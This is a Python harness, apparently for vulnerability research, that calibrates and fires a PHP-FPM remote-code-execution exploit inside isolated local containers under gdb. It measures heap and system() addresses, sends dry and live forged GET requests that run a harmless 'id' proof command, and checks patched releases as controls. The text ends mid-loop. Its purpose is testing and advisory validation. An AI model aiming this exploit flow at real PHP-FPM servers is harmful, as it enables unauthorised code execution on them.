#!/usr/bin/env python3
"""Bounded gdb-direct calibration for PHP-FPM version/architecture variants.

Each sample uses its own uniquely named localhost-only container/network and
records a JSON file plus the complete gdb transcript. A non-triggering dry
payload first calibrates the exact GET shape used by the live request; the
live request then uses the dry payload's measured arData address.
"""
import argparse
import datetime as dt
import http.client
import json
import os
import re
import signal
import subprocess
import sys
import time
import uuid

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))
import rce_bruteforce as B  # noqa: E402
import fpm_rce as F  # noqa: E402

N_BYTES = 4700001
P0_DEFAULT = 0x40
# The fake Bucket's 24-byte prefix contains zval.val/type_info plus its hash;
# the key pointer starts at byte 24 and is explicitly zeroed by forge.php.
# Keep the harmless proof command within the supported 23-byte payload.
CMD = "id>/tmp/u"
PROOF_PATH = "/tmp/u"
PROOF_TOKEN = "uid="
FORGE_ENDPOINT = "/urlenc/forge-variant.php"
if len(CMD.encode()) > 23:
    raise ValueError("EOL proof command exceeds its 23-byte safe payload")
# Keep the bad callback target instruction-aligned. On AArch64 an odd address
# traps with SIGBUS before the oracle can demonstrate the intended unmapped
# instruction fetch as SIGSEGV.
BAD_CANDIDATES = (0x414141414140, 0x414141412140, 0x414140414140)
BRANCHES = {
    "8.1": ("php:8.1.33-fpm", ""),
    "8.0": ("php:8.0.30-fpm", ""),
    "7.4": ("php:7.4.33-fpm", ""),
    "8.2": ("php:8.2.34-fpm", ""),
    "8.3": ("php:8.3.35-fpm", ""),
    "8.4": ("php:8.4.26-fpm", ""),
    "8.5": ("php:8.5.11-fpm", ""),
    # Fixed-release controls make the runner useful for validating the
    # advisory boundary as well as testing vulnerable builds.
    "8.2.35": ("php:8.2.35-fpm", ""),
    "8.3.36": ("php:8.3.36-fpm", ""),
    "8.4.27": ("php:8.4.27-fpm", ""),
    "8.5.12": ("php:8.5.12-fpm", ""),
    # Native x86_64 guest samples use the same public images with an explicit
    # platform request.  Keep the architecture in the key so evidence names
    # cannot be mistaken for the ARM64 runs above.
    "x86_64": ("php:8.4.26-fpm", "linux/amd64"),
    "x86_64-8.1": ("php:8.1.33-fpm", "linux/amd64"),
    "x86_64-8.0": ("php:8.0.30-fpm", "linux/amd64"),
    "x86_64-7.4": ("php:7.4.33-fpm", "linux/amd64"),
    "x86_64-8.5": ("php:8.5.11-fpm", "linux/amd64"),
    "x86_64-8.4.27": ("php:8.4.27-fpm", "linux/amd64"),
    "alpine-8.4": ("php:8.4.26-fpm-alpine", ""),
    "alpine-8.1": ("php:8.1.33-fpm-alpine", ""),
}
FIXED_CONTROLS = {"8.2.35", "8.3.36", "8.4.27", "8.5.12",
                  "x86_64-8.4.27"}


def now_utc():
    return dt.datetime.now(dt.timezone.utc).isoformat()


def docker(*args, timeout=60):
    return subprocess.run(["docker", *map(str, args)], capture_output=True,
                          text=True, timeout=timeout)


def parse_huge(text):
    return [(int(m.group(1)), int(m.group(2), 16)) for m in re.finditer(
        r"HUGEKEYIND arch=.*? len=(\d+).*? arData=0x([0-9a-fA-F]+)", text)]


def parse_system(text):
    hits = re.findall(r"\$1 = \(void \*\) (0x[0-9a-fA-F]+)", text)
    return int(hits[-1], 16) if hits else None


def forge_url(ardata=None, system_addr=None, trigger=0, probe=False,
              dry=False, p0=P0_DEFAULT, fake_gc_refcount=1,
              trigger_slots=4, trigger_bucket=0):
    q = "%s?p0=%d&n=%d" % (FORGE_ENDPOINT, p0, N_BYTES)
    if probe:
        return q + "&probe=1"
    q += "&a=%d&s=%d&c=%s&t=%d&dry=%d" % (
        int(ardata or 0), int(system_addr or 0), CMD.encode().hex(),
        trigger, int(dry))
    if fake_gc_refcount != 1:
        q += "&gc=%d" % int(fake_gc_refcount)
    if trigger_slots != 4:
        q += "&slots=%d" % int(trigger_slots)
    if trigger_bucket != 0:
        q += "&slot=%d" % int(trigger_bucket)
    return q


def child_pid(container):
    # Avoid depending on procps before the GDB bootstrap installs it. The
    # FPM container's PID 1 is the master and /proc exposes its child workers.
    r = docker("exec", container, "cat", "/proc/1/task/1/children", timeout=10)
    if r.returncode == 0:
        pids = [int(x) for x in r.stdout.split() if x.isdigit() and int(x) != 1]
        if pids:
            return pids[0]
    r = docker("exec", container, "pgrep", "php-fpm")
    if r.returncode != 0:
        return None
    pids = [int(x) for x in r.stdout.split() if x.isdigit() and int(x) != 1]
    return pids[0] if pids else None


def wait_worker(container, timeout=30):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        pid = child_pid(container)
        if pid:
            return pid
        time.sleep(0.25)
    return None


def runtime_identity(container, pid):
    ldd = docker("exec", container, "ldd", "--version", timeout=10)
    packages = docker(
        "exec", container, "dpkg-query", "-W", "-f",
        "${binary:Package}=${Version}\\n", "libc6", "libc6-dbg", "gdb",
        timeout=10)
    maps = docker("exec", container, "cat", "/proc/%d/maps" % pid,
                  timeout=10)
    libc_maps = [line for line in maps.stdout.splitlines()
                 if "libc.so" in line or "ld-linux" in line]
    return {
        "worker_pid": pid,
        "ldd_head": ldd.stdout.splitlines()[:1],
        "ldd_exit_code": ldd.returncode,
        "packages": packages.stdout.splitlines(),
        "package_query_exit_code": packages.returncode,
        "libc_map_lines": libc_maps,
        "maps_exit_code": maps.returncode,
    }


def http_request(port, method, path, timeout):
    try:
        result = B.http(port, method, path, timeout=timeout)
    except (http.client.HTTPException, OSError) as exc:
        return -1, ("%s: %s" % (type(exc).__name__, exc)).encode()
    if result is None:
        return -1, b"no HTTP response"
    return result


def hugekey_blocks(text):
    return list(re.finditer(
        r"HUGEKEYIND arch=.*? arData=0x([0-9a-fA-F]+).*?\n\s+buckets=([0-9a-fA-F]+)",
        text, re.S))


def forged_bucket_indices(text, expected):
    blocks = hugekey_blocks(text)
    if not blocks:
        return []
    raw = bytes.fromhex(blocks[-1].group(2))
    indices = []
    for i in range(len(raw) // 32):
        val = int.from_bytes(raw[i * 32:i * 32 + 8], "little")
        typ = int.from_bytes(raw[i * 32 + 8:i * 32 + 12], "little")
        if val == expected and typ in (0x07, 0x107):
            indices.append(i)
    return indices


def fake_array_destroy_seen(text, ardata):
    if ardata is None:
        return False
    fake_ht = ardata + 0x80
    return re.search(r"DEST ht=0x%x(?:\s|$)" % fake_ht, text) is not None


def attack_ht(text):
    hits = re.findall(
        r"HUGEKEYIND arch=.*? ht=(0x[0-9a-fA-F]+) len=\d+ .*?arData=0x([0-9a-fA-F]+)",
        text)
    return tuple(int(x, 16) for x in hits[-1]) if hits else (None, None)


def destroyed_bucket1(text, ht, ardata):
    """Decode bucket 1 from the final destroy snapshot of the attack HashTable."""
    if ht is None or ardata is None:
        return None
    pattern = re.compile(
        r"DEST ht=(0x[0-9a-fA-F]+) arData=(0x[0-9a-fA-F]+) "
        r"nNumUsed=(\d+) nTableSize=(\d+)\s*\n\s+buckets=([0-9a-fA-F]+)")
    matches = list(pattern.finditer(text))
    for match in reversed(matches):
        if int(match.group(1), 16) != ht or int(match.group(2), 16) != ardata:
            continue
        raw = bytes.fromhex(match.group(5))
        if len(raw) < 44:
            return None
        return {"ptr": "0x%x" % int.from_bytes(raw[32:40], "little"),
                "type_info": "0x%x" % int.from_bytes(raw[40:44], "little"),
                "n_num_used": int(match.group(3))}
    return None


def result_classification(row, log_text):
    if row.get("kind") == "oracle":
        if row.get("oracle", {}).get("confirmed"):
            return "oracle_confirmed"
        if row.get("expected_patch_control"):
            return "oracle_not_confirmed_patch_control"
        return "oracle_not_confirmed"
    if row.get("expected_patch_control"):
        closure = row.get("gdb_closure", {})
        bucket = closure.get("attack_bucket1_at_destroy") or {}
        fake_ht = closure.get("fake_array_ht")
        rewritten = bucket.get("ptr") and fake_ht and bucket["ptr"].lower() != fake_ht.lower()
        rewritten_type = bucket.get("type_info") not in (None, "0x107")
        if (row.get("hit") or closure.get("fake_array_destroy_seen")
                or closure.get("system_call_seen")):
            return "patch_regression_observed"
        if (row.get("attack", {}).get("address_match")
                and closure.get("zend_array_destroy_seen")
                and not closure.get("fake_array_destroy_seen")
                and not closure.get("system_call_seen")
                and rewritten and rewritten_type):
            return "patch_control_passed"
        return "patch_control_inconclusive"
    if row.get("hit"):
        return "rce_confirmed"
    if row.get("status") == "failed":
        if (row.get("platform") == "linux/amd64"
                and "ptrace: Function not implemented" in log_text):
            return "environment_blocked"
        return "inconclusive"
    return "rce_not_demonstrated"


def failure_evidence(row, log_text):
    evidence = []
    if row.get("error"):
        evidence.append("run error: " + row["error"])
    if (row.get("platform") == "linux/amd64"
            and "ptrace: Function not implemented" in log_text):
        evidence.append(
            "The amd64 PHP-FPM container started, but GDB attach was rejected with "
            "ptrace: Function not implemented on this %s Docker host; no calibrated "
            "probe or live exploit request was sent. Repeat this architecture check "
            "on a native x86_64 Linux Docker host." % row.get("host_arch", "unknown-arch"))
    runtime = row.get("php_runtime_check", {})
    if runtime:
        evidence.append("PHP runtime: " + " ".join(runtime.get("version_head", [])))
    attack = row.get("attack", {})
    if attack:
        evidence.append("arData dry/attack match=%s; delta=%s" %
                        (attack.get("address_match"), attack.get("dry_to_attack_delta")))
    closure = row.get("gdb_closure", {})
    if closure:
        evidence.append("GDB fake destroy=%s, system entry=%s, execve=%s, vfork=%s" %
                        (closure.get("fake_array_destroy_seen"),
                         closure.get("system_call_seen"),
                         closure.get("execve_function_seen"),
                         closure.get("vfork_seen")))
        if closure.get("system_return_values"):
            evidence.append("system() return values: " +
                            ", ".join(closure["system_return_values"]))
        if closure.get("delayed_oom_handler_seen"):
            evidence.append("GDB trace contains zend_handle_delayed_oom")
        if closure.get("out_gc_refcount_values"):
            evidence.append("outer $out GC watch values: " +
                            ", ".join(closure["out_gc_refcount_values"]))
        if closure.get("attack_bucket1_at_destroy"):
            evidence.append("attack outer bucket1 at destroy: " +
                            json.dumps(closure["attack_bucket1_at_destroy"], sort_keys=True))
    trigger = row.get("shutdown_trigger", {}).get("contents") or ""
    if trigger:
        evidence.append("shutdown callback markers: " +
                        " | ".join(x for x in trigger.splitlines() if x.startswith("SDFN ")))
    dry = row.get("dry_run", {})
    if dry:
        evidence.append(
            "dry calibration HTTP=%s, worker pid %s -> %s, GDB signal=%s" %
            (dry.get("http_status"), dry.get("worker_pid_before"),
             dry.get("worker_pid_after"), dry.get("gdb_signal_seen")))
        if dry.get("shutdown_log"):
            evidence.append("dry shutdown markers: " +
                            " | ".join(x for x in dry["shutdown_log"].splitlines()
                                       if x.startswith("SDFN ")))
    fpm = row.get("fpm_log", {}).get("tail", "")
    if "stack smashing detected" in fpm:
        evidence.append("FPM reports stack-smashing protection and worker abort")
    if "signal 11 (SIGSEGV)" in fpm:
        evidence.append("FPM reports worker SIGSEGV")
    if "SIGNAL_TRACE SIGSEGV" in log_text:
        evidence.append("GDB records SIGSEGV backtrace")
    if "SIGNAL_TRACE SIGABRT" in log_text:
        evidence.append("GDB records SIGABRT backtrace")
    # Oracle samples intentionally have no command proof token or proof file.
    # Do not let the generic RCE proof check turn a confirmed SIGSEGV into an
    # evidence-summary exception (None is not a valid left operand for `in`).
    proof_token = row.get("proof_token")
    if row.get("kind") == "rce" and proof_token is not None:
        if proof_token not in row.get("proof", ""):
            evidence.append("No configured command proof token %r in %s" %
                            (proof_token, row.get("proof_path", PROOF_PATH)))
    return evidence


def maps_contain(container, pid, addr):
    r = docker("exec", container, "cat", "/proc/%d/maps" % pid)
    if r.returncode != 0:
        return None
    for line in r.stdout.splitlines():
        bounds = line.split(None, 1)[0]
        lo, hi = (int(x, 16) for x in bounds.split("-", 1))
        if lo <= addr < hi:
            return True
    return False


def select_unmapped(container, pid):
    for candidate in BAD_CANDIDATES:
        mapped = maps_contain(container, pid, candidate)
        if mapped is False:
            return candidate
    return None


def stop_gdb(container, proc, process_record):
    process_record["stopped_at_utc"] = now_utc()
    process_record["stop_method"] = "SIGTERM process group; then TERM/KILL gdb in dedicated container"
    if proc is not None and proc.poll() is None:
        try:
            os.killpg(proc.pid, signal.SIGTERM)
            proc.wait(timeout=10)
            process_record["host_exit_code"] = proc.returncode
        except subprocess.TimeoutExpired:
            os.killpg(proc.pid, signal.SIGKILL)
            proc.wait(timeout=5)
            process_record["host_exit_code"] = proc.returncode
            process_record["forced_host_kill"] = True
    if container:
        r = docker("exec", container, "pgrep", "-x", "gdb", timeout=10)
        pids = [int(x) for x in r.stdout.split() if x.isdigit()]
        process_record["container_gdb_pids_before_stop"] = pids
        for pid in pids:
            docker("exec", container, "kill", "-TERM", pid, timeout=10)
        time.sleep(1)
        r = docker("exec", container, "pgrep", "-x", "gdb", timeout=10)
        left = [int(x) for x in r.stdout.split() if x.isdigit()]
        if left:
            for pid in left:
                docker("exec", container, "kill", "-KILL", pid, timeout=10)
        r = docker("exec", container, "pgrep", "-x", "gdb", timeout=10)
        process_record["container_gdb_pids_after_stop"] = [
            int(x) for x in r.stdout.split() if x.isdigit()]


def container_metadata(container):
    r = docker("inspect", "--format",
               "{{.Id}} {{.State.StartedAt}} {{.Config.Image}} {{.Image}}",
               container)
    if r.returncode:
        return {"inspect_error": r.stderr.strip()}
    bits = r.stdout.strip().split()
    if len(bits) >= 4:
        return {"id": bits[0], "started_at": bits[1], "configured_image": bits[2],
                "image_id": bits[3]}
    return {"raw": r.stdout.strip()}


def clean_lab():
    results = {}
    for name in (F.NGX_NAME, F.FPM_NAME):
        inspected = docker("inspect", "--format", "{{.State.Running}}", name,
                           timeout=10)
        if inspected.returncode:
            results[name] = "absent"
            continue
        results[name] = "already stopped"
        if inspected.stdout.strip() == "true":
            stopped = docker("stop", "--time", "10", name, timeout=20)
            results[name] = "stopped" if stopped.returncode == 0 else (
                "normal stop failed: " + stopped.stderr.strip())
            inspected = docker("inspect", "--format", "{{.State.Running}}",
                               name, timeout=10)
            if inspected.returncode == 0 and inspected.stdout.strip() == "true":
                docker("kill", "--signal", "KILL", name, timeout=10)
                results[name] += "; forced kill sent"
        removed = docker("rm", name, timeout=10)
        if removed.returncode:
            results[name] += "; remove failed: " + removed.stderr.strip()
        else:
            results[name] += "; removed"
        if docker("inspect", name, timeout=10).returncode == 0:
            results[name] += "; cleanup verification failed"
    r = docker("network", "inspect", F.NET_NAME, timeout=10)
    if r.returncode:
        results[F.NET_NAME] = "absent"
    else:
        removed = docker("network", "rm", F.NET_NAME, timeout=10)
        results[F.NET_NAME] = ("removed" if removed.returncode == 0 else
                               "remove failed: " + removed.stderr.strip())
        if docker("network", "inspect", F.NET_NAME, timeout=10).returncode == 0:
            results[F.NET_NAME] += "; cleanup verification failed"
    return results


def run_sample(branch, tag, platform, kind, out_path, port, p0, trigger_mode,
               fake_gc_refcount, trigger_profile, trigger_slots=4,
               trigger_bucket=0):
    run_id = uuid.uuid4().hex[:8]
    prefix = "vmat-%s-%s-%s" % (branch.replace(".", ""), kind, run_id)
    F.FPM_NAME = prefix + "-php"
    F.NGX_NAME = prefix + "-nginx"
    F.NET_NAME = prefix + "-net"
    FPM = F.FPM_NAME
    B.CMD = CMD
    B.CONTAINER = FPM
    row = {
        "run_id": run_id, "branch": branch, "tag": tag,
        "platform": platform or "native", "kind": kind, "p0": hex(p0),
        "host_arch": os.uname().machine,
        "n": N_BYTES, "cmd": CMD if kind == "rce" else None,
        "cmd_bytes": len(CMD.encode()) if kind == "rce" else None,
        "proof_path": PROOF_PATH if kind == "rce" else None,
        "proof_token": PROOF_TOKEN if kind == "rce" else None,
        "fake_bucket_key_safe": (len(CMD.encode()) <= 23) if kind == "rce" else None,
        "expected_patch_control": branch in FIXED_CONTROLS,
        "trigger_mode": trigger_mode,
        "fake_gc_refcount": fake_gc_refcount,
        "trigger_profile": trigger_profile,
        "trigger_slots": trigger_slots,
        "trigger_bucket": trigger_bucket,
        "started_at_utc": now_utc(), "timeout_seconds": {
            "docker_exec": 60, "gdb_install": 1200,
            "http_request": 180, "gdb_session": 900},
        "processes": {}, "evidence": {"json": out_path,
                                           "gdb_log": out_path + ".gdb.log"},
        "validation_rubric": [
            "Confirm the requested PHP-FPM image, worker, and architecture started.",
            "Run a harmless CLI system('id') control as www-data to distinguish container shell restrictions from exploit-path failure.",
            "Observe the huge-key insertion in gdb and record the live arData address.",
            "Verify the exact-shaped dry run does not create the command proof file.",
            "For RCE, require the configured proof token; for oracle, require a new SIGSEGV from an unmapped pDestructor.",
            "Retain gdb evidence for zend_array_destroy and the vfork or fault path."],
    }
    if kind == "oracle":
        row["oracle"] = {}
    gdb_proc = None
    log_fh = None
    container_started = False
    try:
        F.start_fpm(port, children=1, ptrace=True, image=tag, platform=platform)
        container_started = True
        row["container"] = container_metadata(FPM)
        row["nginx_container"] = container_metadata(F.NGX_NAME)
        row["port"] = port
        row["processes"]["fpm_container"] = {
            "purpose": "isolated vulnerable php-fpm target for this sample",
            "id": row["container"].get("id"),
            "started_at_utc": row["container"].get("started_at"),
            "runtime_limit_seconds": 1800,
            "stop_method": "docker stop --time 10; verify; remove, force-kill only if needed",
        }
        row["processes"]["nginx_container"] = {
            "purpose": "localhost-only HTTP front end for this sample",
            "id": row["nginx_container"].get("id"),
            "started_at_utc": row["nginx_container"].get("started_at"),
            "runtime_limit_seconds": 1800,
            "stop_method": "docker stop --time 10; verify; remove, force-kill only if needed",
        }
        nginx_test = docker("exec", F.NGX_NAME, "nginx", "-t", timeout=15)
        row["nginx_config_check"] = {
            "exit_code": nginx_test.returncode,
            "output": (nginx_test.stdout + nginx_test.stderr).strip(),
        }
        if nginx_test.returncode:
            raise RuntimeError("nginx config/upstream check failed")
        docker("exec", FPM, "rm", "-f", PROOF_PATH)
        version = docker("exec", FPM, "php", "-v", timeout=15)
        lint = docker("exec", FPM, "php", "-l",
                      "/var/www/html" + FORGE_ENDPOINT, timeout=15)
        row["php_runtime_check"] = {
            "version_exit_code": version.returncode,
            "version_head": version.stdout.splitlines()[:2],
            "lint_exit_code": lint.returncode,
            "lint_output": (lint.stdout + lint.stderr).strip(),
        }
        if version.returncode or lint.returncode:
            raise RuntimeError("PHP runtime/lint check failed in target container")

        preflight_path = "/tmp/php-system-preflight"
        docker("exec", FPM, "rm", "-f", preflight_path)
        preflight = docker(
            "exec", "--user", "www-data", FPM, "php", "-r",
            'system("id > /tmp/php-system-preflight");', timeout=20)
        preflight_file = docker("exec", FPM, "cat", preflight_path, timeout=10)
        row["system_preflight"] = {
            "user": "www-data",
            "exit_code": preflight.returncode,
            "stdout": preflight.stdout.strip(),
            "stderr": preflight.stderr.strip(),
            "proof": preflight_file.stdout.strip()
                     if preflight_file.returncode == 0 else "",
            "proof_exists": preflight_file.returncode == 0,
            "proof_path": preflight_path,
            "conclusion": (
                "CLI system() created id proof as www-data"
                if preflight_file.returncode == 0
                and "uid=" in preflight_file.stdout else
                "CLI system() control did not produce uid= proof"),
        }
        docker("exec", FPM, "rm", "-f", preflight_path)

        pre_install_children = docker(
            "exec", FPM, "cat", "/proc/1/task/1/children", timeout=10)
        pre_install_pgrep = docker("exec", FPM, "pgrep", "php-fpm", timeout=10)
        row["preinstall_worker_discovery"] = {
            "proc_children": pre_install_children.stdout.strip(),
            "proc_children_exit_code": pre_install_children.returncode,
            "pgrep_stdout": pre_install_pgrep.stdout.strip(),
            "pgrep_exit_code": pre_install_pgrep.returncode,
            "pgrep_stderr": pre_install_pgrep.stderr.strip(),
        }
        pre_install_worker = wait_worker(FPM, timeout=30)
        if not pre_install_worker:
            raise RuntimeError("no FPM worker before debugger bootstrap")
        row["runtime_identity_before_gdb_install"] = runtime_identity(
            FPM, pre_install_worker)

        cp = docker("cp", os.path.join(ROOT, "docker", "gdb_install.sh"),
                    "%s:/tmp/gdb_install.sh" % FPM, timeout=30)
        if cp.returncode:
            raise RuntimeError("docker cp gdb installer failed: " + cp.stderr.strip())
        install = docker("exec", FPM, "sh", "/tmp/gdb_install.sh", timeout=1200)
        row["gdb_install"] = {"exit_code": install.returncode,
                              "stdout_tail": install.stdout[-300:],
                              "stderr_tail": install.stderr[-300:],
                              "timeout_seconds": 1200}
        if install.returncode or "gdb" not in install.stdout:
            raise RuntimeError("gdb bootstrap failed; see gdb_install evidence")
        row["runtime_identity_after_gdb_install"] = runtime_identity(
            FPM, pre_install_worker)
        restart_started = now_utc()
        restart = docker("restart", "--time", "10", FPM, timeout=30)
        row["fpm_restart_after_gdb_install"] = {
            "started_at_utc": restart_started,
            "exit_code": restart.returncode,
            "output": restart.stdout.strip(),
            "error": restart.stderr.strip(),
            "purpose": "ensure the debugger uses symbols for the libc actually mapped by the target worker",
        }
        if restart.returncode:
            raise RuntimeError("FPM restart after debugger bootstrap failed")
        pid = wait_worker(FPM, timeout=30)
        if not pid:
            raise RuntimeError("no FPM worker after debugger-bootstrap restart")
        row["worker_pid_after_gdb_restart"] = pid
        row["runtime_identity_after_fpm_restart"] = runtime_identity(FPM, pid)
        post_install_preflight_path = "/tmp/php-system-preflight-after-gdb"
        docker("exec", FPM, "rm", "-f", post_install_preflight_path)
        post_install_preflight = docker(
            "exec", "--user", "www-data", FPM, "php", "-r",
            'system("id > /tmp/php-system-preflight-after-gdb");', timeout=20)
        post_install_file = docker("exec", FPM, "cat",
                                   post_install_preflight_path, timeout=10)
        row["system_preflight_after_gdb_install"] = {
            "user": "www-data",
            "exit_code": post_install_preflight.returncode,
            "proof": (post_install_file.stdout.strip()
                      if post_install_file.returncode == 0 else ""),
            "proof_exists": post_install_file.returncode == 0,
            "proof_path": post_install_preflight_path,
        }
        docker("exec", FPM, "rm", "-f", post_install_preflight_path)
        cp = docker("cp", os.path.join(ROOT, "docker", "ht_dump_fpm2.py"),
                    "%s:/opt/ht_dump_fpm2.py" % FPM, timeout=30)
        if cp.returncode:
            raise RuntimeError("docker cp gdb probe failed: " + cp.stderr.strip())
        pid = child_pid(FPM)
        if not pid:
            raise RuntimeError("no php-fpm worker found after startup")
        row["worker_pid"] = pid
        row["processes"]["gdb"] = {
            "purpose": "bounded debugger trace of the owned php-fpm worker",
            "pid": None, "started_at_utc": now_utc(),
            "runtime_limit_seconds": 900,
            "stop_method": "SIGTERM process group; TERM/KILL gdb in dedicated container",
        }
        gdb_args = ["docker", "exec", "-e", "FPM_GDB_SKIP_HUGEKEYS=2", FPM,
                    "stdbuf", "-oL", "-eL", "gdb", "-p", str(pid), "--batch",
                    "-ex", "set pagination off", "-ex", "set confirm off",
                    "-ex", "set follow-fork-mode child",
                    "-ex", "set detach-on-fork on",
                    "-ex", "handle SIGPIPE nostop noprint pass",
                    "-ex", "handle SIGSEGV stop print pass",
                    "-ex", "handle SIGBUS stop print pass",
                    "-ex", "handle SIGABRT stop print pass",
                    "-ex", "catch fork",
                    "-ex", "catch vfork",
                    "-ex", "catch exec",
                    "-ex", "catch syscall clone",
                    "-ex", "catch syscall execve",
                    "-ex", "print (void*)&system",
                    "-ex", "source /opt/ht_dump_fpm2.py"] + [
                        item for _ in range(300) for item in ("-ex", "continue")]
        log_fh = open(row["evidence"]["gdb_log"], "w", buffering=1)
        gdb_proc = subprocess.Popen(gdb_args, stdout=log_fh,
                                    stderr=subprocess.STDOUT,
                                    start_new_session=True)
        row["processes"]["gdb"]["pid"] = gdb_proc.pid
        row["processes"]["gdb"]["process_group"] = gdb_proc.pid
        time.sleep(4)
        if gdb_proc.poll() is not None:
            raise RuntimeError("gdb exited during attach; see gdb log")

        probe_status, probe_body = http_request(
            port, "GET", forge_url(probe=True, p0=p0), timeout=180)
        time.sleep(0.3)
        log_text = open(row["evidence"]["gdb_log"], errors="replace").read()
        probe_hits = parse_huge(log_text)
        probe_ardata = probe_hits[-1][1] if probe_hits else None
        system_addr = parse_system(log_text)
        row["probe"] = {"http_status": probe_status,
                        "http_head": (probe_body or b"")[:160].decode("utf-8", "replace"),
                        "ardata": hex(probe_ardata) if probe_ardata else None,
                        "hugekey_count": len(probe_hits),
                        "system": hex(system_addr) if system_addr else None}
        if probe_ardata is None or system_addr is None:
            if probe_ardata is None and probe_status != 200:
                row["failure_analysis"] = (
                    "The HTTP probe returned status %s, so the request did not complete successfully through the expected endpoint. "
                    "The response head and debugger log are retained for the routing/FPM error." % probe_status)
            elif probe_ardata is None:
                row["failure_analysis"] = (
                    "The HTTP probe returned status 200 and gdb attached, but zend_hash_str_update_ind did not log the huge-key insert. "
                    "This narrows the failure to request-body/route execution or the debugger breakpoint/length filter; the response head and gdb log are retained.")
            else:
                row["failure_analysis"] = (
                    "The huge-key breakpoint logged arData, but gdb did not resolve &system in this target image.")
            raise RuntimeError("probe did not provide arData and system address")

        bad_s = None
        if kind == "oracle":
            bad_s = select_unmapped(FPM, pid)
            row["oracle_target"] = {"candidate": hex(bad_s) if bad_s else None,
                                    "unmapped": bad_s is not None}
            if bad_s is None:
                raise RuntimeError("could not verify an unmapped pDestructor address")
        target_s = system_addr if kind == "rce" else bad_s

        # Exact-shaped dry run: every GET field and the trigger function are
        # present, but 0x07 omits IS_TYPE_REFCOUNTED, so the forged array is
        # never destroyed and cannot call its pDestructor.
        dry_before = parse_huge(log_text)
        trigger_mode = row["trigger_mode"]
        dry_url = forge_url(probe_ardata, target_s, trigger=trigger_mode,
                            dry=True, p0=p0,
                            fake_gc_refcount=fake_gc_refcount,
                            trigger_slots=trigger_slots,
                            trigger_bucket=trigger_bucket)
        dry_log_start = len(log_text)
        dry_status, dry_body = http_request(port, "GET", dry_url, timeout=180)
        time.sleep(0.3)
        log_text = open(row["evidence"]["gdb_log"], errors="replace").read()
        dry_log_delta = log_text[dry_log_start:]
        dry_hits = parse_huge(log_text)
        dry_ardata = dry_hits[-1][1] if len(dry_hits) > len(dry_before) else None
        dry_worker_pid = child_pid(FPM)
        dry_signal_seen = any(marker in dry_log_delta for marker in (
            "Program received signal SIGSEGV",
            "Program received signal SIGABRT",
            "SIGNAL_TRACE SIGSEGV",
            "SIGNAL_TRACE SIGABRT"))
        row["dry_run"] = {
            "http_status": dry_status,
            "http_head": (dry_body or b"")[:100].decode("utf-8", "replace"),
            "ardata": hex(dry_ardata) if dry_ardata else None,
            "expected_fake_array_slot_indices": forged_bucket_indices(
                log_text, probe_ardata + 0x80),
            "proof_file_absent": docker("exec", FPM, "test", "!", "-e",
                                         PROOF_PATH).returncode == 0,
            "worker_pid_before": pid,
            "worker_pid_after": dry_worker_pid,
            "worker_restarted": dry_worker_pid != pid,
            "gdb_signal_seen": dry_signal_seen,
            "gdb_alive_after_request": gdb_proc.poll() is None,
        }
        if (dry_status != 200 or dry_worker_pid != pid or dry_signal_seen
                or gdb_proc.poll() is not None):
            shutdown_probe = docker("exec", FPM, "cat", "/tmp/f.log", timeout=10)
            shutdown_text = (shutdown_probe.stdout[-1000:]
                             if shutdown_probe.returncode == 0 else "")
            row["dry_run"]["shutdown_log"] = shutdown_text
            row["failure_analysis"] = (
                "The trigger-bearing dry calibration request failed before an attack request was sent "
                "(HTTP status %s, worker pid %s -> %s). GDB recorded this shutdown-path fault: %s. "
                "The callback log reached %r and did not reach 'SDFN pop done'; the fault is inside "
                "the trigger-mode cleanup operation, before fake-array destruction or system(). "
                "The separate www-data CLI system() control passed, so this run isolates a mode-2 "
                "array_pop/hash-bucket incompatibility in PHP %s, not a command-execution restriction. "
                "The attack request is suppressed because the debugger is attached to a dead or changed worker. "
                "No RCE is claimed." % (
                    dry_status, pid, dry_worker_pid,
                    "SIGSEGV" if "SIGSEGV" in dry_log_delta else
                    "SIGABRT" if "SIGABRT" in dry_log_delta else
                    "no signal marker",
                    shutdown_text.replace("\n", " | "), branch))
            raise RuntimeError("trigger-bearing dry calibration failed; attack suppressed")
        if dry_ardata is None:
            raise RuntimeError("exact-shaped dry run produced no arData measurement")

        if kind == "rce":
            docker("exec", FPM, "rm", "-f", PROOF_PATH)
        else:
            before_logs = docker("logs", FPM)
            row["oracle"]["segv_before"] = (
                before_logs.stdout + before_logs.stderr).count(
                    "signal 11 (SIGSEGV)")

        attack_url = forge_url(dry_ardata, target_s, trigger=trigger_mode,
                               dry=False, p0=p0,
                               fake_gc_refcount=fake_gc_refcount,
                               trigger_slots=trigger_slots,
                               trigger_bucket=trigger_bucket)
        attack_status, attack_body = http_request(port, "GET", attack_url,
                                                  timeout=180)
        time.sleep(1)
        log_text = open(row["evidence"]["gdb_log"], errors="replace").read()
        attack_hits = parse_huge(log_text)
        attack_ardata = attack_hits[-1][1] if len(attack_hits) > len(dry_hits) else None
        row["attack"] = {
            "http_status": attack_status,
            "http_head": (attack_body or b"")[:100].decode("utf-8", "replace"),
            "predicted_ardata": hex(dry_ardata),
            "actual_ardata": hex(attack_ardata) if attack_ardata else None,
            "address_match": attack_ardata == dry_ardata if attack_ardata else False,
            "probe_to_dry_delta": hex(dry_ardata - probe_ardata),
            "probe_to_attack_delta": (hex(attack_ardata - probe_ardata)
                                       if attack_ardata else None),
            "dry_to_attack_delta": (hex(attack_ardata - dry_ardata)
                                    if attack_ardata else None),
        }
        fpm_logs = docker("logs", FPM)
        gdb_lines = log_text.splitlines()
        shutdown_probe = docker("exec", FPM, "cat", "/tmp/f.log", timeout=10)
        row["shutdown_trigger"] = {
            "file_present": shutdown_probe.returncode == 0,
            "contents": shutdown_probe.stdout[-1000:] if shutdown_probe.returncode == 0 else None,
            "read_error": shutdown_probe.stderr.strip() if shutdown_probe.returncode else None,
        }
        signal_excerpt = ""
        for i, line in enumerate(gdb_lines):
            if line.startswith("SIGNAL_TRACE "):
                signal_excerpt = "\n".join(gdb_lines[max(0, i - 2):i + 24])
                break
        row["fpm_log"] = {
            "exit_code": fpm_logs.returncode,
            "tail": (fpm_logs.stdout + fpm_logs.stderr)[-1600:],
            "sigsegv_count": (fpm_logs.stdout + fpm_logs.stderr).count("signal 11 (SIGSEGV)"),
            "sigabrt_count": (fpm_logs.stdout + fpm_logs.stderr).count("signal 6 (SIGABRT)"),
        }

        if kind == "rce":
            proof = ""
            for _ in range(5):
